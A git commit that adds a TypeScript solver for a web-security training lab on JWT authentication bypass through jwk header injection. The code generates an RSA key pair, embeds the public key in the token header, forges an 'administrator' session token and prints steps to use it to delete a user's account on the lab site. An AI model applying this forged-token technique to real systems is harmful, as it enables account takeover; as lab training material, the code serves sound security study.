6211cf504547240577ef15ec9dcedb8156b52d79
Den <Den@example.com>
2024-07-01 15:21:03 +0300

    add lab: JWT authentication bypass via jwk header injection

---
+++ src/labs/jwt/jwt_authentication_bypass_via_jwk_header_injection/lab.ts
@@ -0,0 +1,31 @@
+import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
+import { runTasks } from "../../../utils/runTasks.js";
+import { JWT } from "../utils/JWT.js";
+import { generateKeyPairSync } from "node:crypto";
+
+const { labUrl } = getParsedInputFromUser({
+  description: "Lab: JWT authentication bypass via jwk header injection",
+  proxy: true,
+});
+
+runTasks([task]);
+
+function task() {
+  console.log(`
+To solve the lab:
+  1. Edit your browser cookie for the lab site with key "session" and value "${createAdminJwtWithJwkInjected()}"
+  2. Go to admin page:
+  "${labUrl}admin"
+  3. Delete carlos's account
+`);
+}
+
+function createAdminJwtWithJwkInjected() {
+  const { publicKey, privateKey } = generateKeyPairSync("rsa", {
+    modulusLength: 2048,
+  });
+  const jwk = publicKey.export({ format: "jwk" });
+  const header = { alg: "RS256", jwk };
+  const payload = { sub: "administrator" };
+  return new JWT({ header, payload }).signWithPrivateKey(privateKey);
+}
